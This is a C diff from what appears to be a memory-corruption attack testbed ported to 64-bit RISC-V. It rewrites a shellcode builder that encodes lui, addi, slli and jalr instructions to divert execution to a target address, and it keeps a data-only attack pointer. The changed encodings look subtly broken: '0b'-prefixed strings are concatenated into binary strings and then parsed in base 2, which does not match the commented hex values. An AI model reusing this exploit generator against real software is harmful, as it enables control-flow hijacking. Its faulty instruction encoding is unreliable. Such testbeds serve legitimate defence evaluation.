@@ -17,14 +17,14 @@
 static boolean output_debug_info = FALSE;
 
 // JM: shellcode is generated in perform_attack()
-char * shellcode_nonop[12];
+char * shellcode_nonop[16];
 
 // JM: data-only target pointer
 uint32_t dop_dest = 0xdeadbeef;
 
 // Do not count for the null terminator since a null in the shellcode will
 // terminate any string function in the standard library
-static size_t size_shellcode_nonop = 12;
+static size_t size_shellcode_nonop = 16;
 
 /* DATA SEGMENT TARGETS */
 /*
@@ -997,19 +997,21 @@ build_shellcode(char * shellcode)
 {
     char attack_addr[9], low_bits[4], high_bits[6];  // target address and its components
     char lui_bin[33], addi_bin[33];                  // binary insn encodings (as strings)
-    char lui_s[9], addi_s[9], * jalr_s = "000300e7"; // hex insn encodings
-    size_t lui_val, addi_val, jalr_val;              // raw binary insn encodings
-	
-	// fix shellcode when lower bits become negative
-	if (((unsigned long)&shellcode_target & 0x00000fff) >= 0x800)
-		hex_to_string(attack_addr, &shellcode_target + 0x1000);
+    char lui_s[9], addi_s[9],* slli_s = "00139393", * jalr_s = "000380e7"; // hex insn encodings
+    size_t lui_val, addi_val, slli_val, jalr_val;              // raw binary insn encodings
+
+	// fix shellcode when lower bits become negative and crop lower bit so
+    // the lui instruction doesn't create a negative address in rv64
+	if ((((unsigned long)&shellcode_target >> 1)  & 0x00000fff) >= 0x800)
+		hex_to_string(attack_addr, ((unsigned long) &shellcode_target >> 1) + 0x1000);
     else
-		hex_to_string(attack_addr, &shellcode_target);
+		hex_to_string(attack_addr, ((unsigned long) &shellcode_target >> 1));
 
     // split attack address into low and high bit strings
     strncpy(low_bits, &attack_addr[5], 3);
     strncpy(high_bits, attack_addr, 5);
 
+    slli_val = strtoul(slli_s, 0, 16);
     jalr_val = strtoul(jalr_s, 0, 16);
 
     // generate 20 imm bits for the LUI insn
@@ -1018,7 +1020,7 @@ build_shellcode(char * shellcode)
     }
 
     // append reg and opcode bits, then convert to raw binary
-    strncat(lui_bin, "001100110111", 12);
+    strncat(lui_bin, "0b1110110111", 12); //lui hex value is 0x3B7
     lui_val = strtoul(lui_bin, 0, 2);
 
     hex_to_string(lui_s, lui_val);
@@ -1028,23 +1030,25 @@ build_shellcode(char * shellcode)
         strncat(addi_bin, hex_to_bin(low_bits[i]), 4);
     }
 
-    strncat(addi_bin, "00110000001100010011", 20);
+    strncat(addi_bin, "0b111000001110010011", 20); //addi hex value is 0x38393
     addi_val = strtoul(addi_bin, 0, 2);
 
     hex_to_string(addi_s, addi_val);
 
     format_instruction(shellcode, lui_val);
     format_instruction(shellcode + 4, addi_val);
-    format_instruction(shellcode + 8, jalr_val);
+    format_instruction(shellcode + 8, slli_val);
+    format_instruction(shellcode + 12, jalr_val);
 
     hex_to_string(lui_s, lui_val);
     hex_to_string(addi_s, addi_val);
 
     if (output_debug_info) {
         printf("----------------\nShellcode instructions:\n");
-        printf("%s0x%-20s%14s\n", "lui t1,  ", high_bits, lui_s);
-        printf("%s0x%-20s%10s\n", "addi t1, t1, ", low_bits, addi_s);
-        printf("%s%38s\n----------------\n", "jalr t1", jalr_s);
+        printf("%s0x%-20s%14s\n", "lui t2,  ", high_bits, lui_s);
+        printf("%s0x%-20s%10s\n", "addi t2, t2, ", low_bits, addi_s);
+        printf("%s%38s\n", "slli t2, t2, 1", slli_s);
+        printf("%s%38s\n----------------\n", "jalr t2", jalr_s);
     }
 } /* build_shellcode */
 
